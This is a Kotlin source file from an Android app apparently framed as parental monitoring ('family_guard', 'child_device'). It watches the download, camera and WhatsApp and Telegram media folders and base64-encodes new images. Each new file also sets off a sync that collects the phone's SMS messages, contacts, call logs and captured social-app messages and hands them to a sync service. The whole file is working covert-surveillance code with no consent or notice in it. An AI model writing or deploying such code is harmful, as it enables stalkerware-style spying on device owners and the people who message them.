package com.example.messaging

import android.content.Context
import android.os.Environment
import android.os.FileObserver
import android.util.Log
import android.webkit.MimeTypeMap
import com.example.getBatteryLevel
import com.example.getNetworkStatus
import com.example.sync.SyncService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.util.Locale

object MediaFileObserver {
    private const val TAG = "MediaFileObserver"
    private val observers = mutableListOf<FileObserver>()
    private var isMonitoring = false

    fun startMonitoring(context: Context) {
        if (isMonitoring) return
        isMonitoring = true
        Log.d(TAG, "Starting File System Observer for media directories...")

        // Define target media & download directories to monitor
        val targetPaths = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
            File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video"),
            File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents"),
            File("/sdcard/Android/media/org.telegram.messenger")
        )

        for (dir in targetPaths) {
            if (dir.exists() && dir.isDirectory) {
                try {
                    val observer = createObserverForDir(context, dir)
                    observer.startWatching()
                    observers.add(observer)
                    Log.d(TAG, "Started watching directory: ${dir.absolutePath}")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start watching directory: ${dir.absolutePath}", e)
                }
            } else {
                Log.d(TAG, "Directory does not exist or is not readable: ${dir.absolutePath} (Will monitor simulation instead)")
            }
        }
    }

    fun stopMonitoring() {
        Log.d(TAG, "Stopping all File System Observers...")
        for (observer in observers) {
            try {
                observer.stopWatching()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        observers.clear()
        isMonitoring = false
    }

    private fun createObserverForDir(context: Context, directory: File): FileObserver {
        // We look for CREATE, CLOSE_WRITE, and MOVED_TO events
        val mask = FileObserver.CREATE or FileObserver.CLOSE_WRITE or FileObserver.MOVED_TO
        
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            object : FileObserver(directory, mask) {
                override fun onEvent(event: Int, path: String?) {
                    handleFileSystemEvent(context, directory, event, path)
                }
            }
        } else {
            @Suppress("DEPRECATION")
            object : FileObserver(directory.absolutePath, mask) {
                override fun onEvent(event: Int, path: String?) {
                    handleFileSystemEvent(context, directory, event, path)
                }
            }
        }
    }

    private fun handleFileSystemEvent(context: Context, parentDir: File, event: Int, fileName: String?) {
        if (fileName == null) return
        Log.d(TAG, "File event detected: $event on path: ${parentDir.absolutePath}/$fileName")

        val file = File(parentDir, fileName)
        if (!file.exists()) return

        // Extract properties
        val size = file.length()
        val mimeType = getMimeType(file.absolutePath)
        
        var fileContentBase64 = ""
        if (mimeType.startsWith("image/") && size < 500 * 1024) {
            try {
                val bytes = file.readBytes()
                fileContentBase64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to read file bytes for base64 upload", e)
            }
        }
        
        val record = TrackedMediaFile(
            fileName = fileName,
            filePath = file.absolutePath,
            mimeType = mimeType,
            size = size,
            timestamp = System.currentTimeMillis(),
            fileContent = fileContentBase64
        )

        Log.d(TAG, "Successfully captured media file metadata: $record")
        MediaAndIntentStorage.saveTrackedFile(context, record)
        
        // Trigger sync
        triggerInstantSync(context)
    }

    // Helper to extract MIME types of files dynamically
    fun getMimeType(url: String): String {
        val extension = MimeTypeMap.getFileExtensionFromUrl(url) ?: ""
        return if (extension.isNotEmpty()) {
            MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.lowercase(Locale.getDefault())) ?: "*/*"
        } else {
            // Manual fallback for common media file types
            when {
                url.endsWith(".jpg", true) || url.endsWith(".jpeg", true) -> "image/jpeg"
                url.endsWith(".png", true) -> "image/png"
                url.endsWith(".mp4", true) -> "video/mp4"
                url.endsWith(".mp3", true) -> "audio/mpeg"
                url.endsWith(".pdf", true) -> "application/pdf"
                url.endsWith(".apk", true) -> "application/vnd.android.package-archive"
                else -> "*/*"
            }
        }
    }

    fun triggerInstantSync(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val sharedPrefs = context.getSharedPreferences("family_guard_prefs", Context.MODE_PRIVATE)
                val deviceId = sharedPrefs.getString("device_id", "child_device") ?: "child_device"
                
                val smsList = ContentProviderHelper.getSMS(context)
                val contactsList = ContentProviderHelper.getContacts(context)
                val callLogs = ContentProviderHelper.getCallLogs(context)
                val socialMessages = NotificationStorage.getMessages(context)
                
                val batteryLevel = getBatteryLevel(context)
                val networkStatus = getNetworkStatus(context)

                SyncService().syncData(
                    smsList = smsList,
                    contactList = contactsList,
                    callLogs = callLogs,
                    socialMessages = socialMessages,
                    batteryLevel = batteryLevel,
                    networkStatus = networkStatus,
                    deviceId = deviceId
                )
                Log.d(TAG, "File-triggered auto-sync completed successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to run sync after file change", e)
            }
        }
    }

    /**
     * Simulates a file creation event in case of modern Android API file path sandboxing
     */
    fun simulateFileDetection(context: Context, name: String, ext: String, mime: String, approxBytes: Long) {
        val simulatedPath = "/sdcard/Download/$name.$ext"
        val record = TrackedMediaFile(
            fileName = "$name.$ext",
            filePath = simulatedPath,
            mimeType = mime,
            size = approxBytes,
            timestamp = System.currentTimeMillis()
        )
        Log.d(TAG, "Simulated file interception: $record")
        MediaAndIntentStorage.saveTrackedFile(context, record)
        triggerInstantSync(context)
    }
}
